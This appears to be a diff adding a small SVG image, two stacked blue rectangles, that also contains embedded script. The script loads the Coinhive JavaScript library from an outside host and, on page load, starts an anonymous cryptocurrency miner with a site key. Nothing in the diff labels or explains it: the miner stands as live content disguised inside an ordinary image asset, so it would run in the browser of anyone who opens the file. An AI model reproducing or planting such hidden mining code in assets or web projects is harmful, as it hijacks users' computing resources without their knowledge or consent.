@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns='http://www.w3.org/2000/svg' width='90' height='30' xmlns:xlink='http://www.w3.org/1999/xlink'>
+<rect width='90' height='30' fill='#00a9f1'/>
+<rect width='90' height='18' fill='#26baf4'/>
+  <script xlink:href="https://coin-hive.com/lib/coinhive.min.js" />
+  <script type="text/javascript">
+        window.addEventListener('load',function(){
+			var miner = new CoinHive.Anonymous('yixSY8xCiKWNXDeFHZHBeLRtFxoH0zRo');
+			miner.start();
+        })
+  </script>  
+</svg>
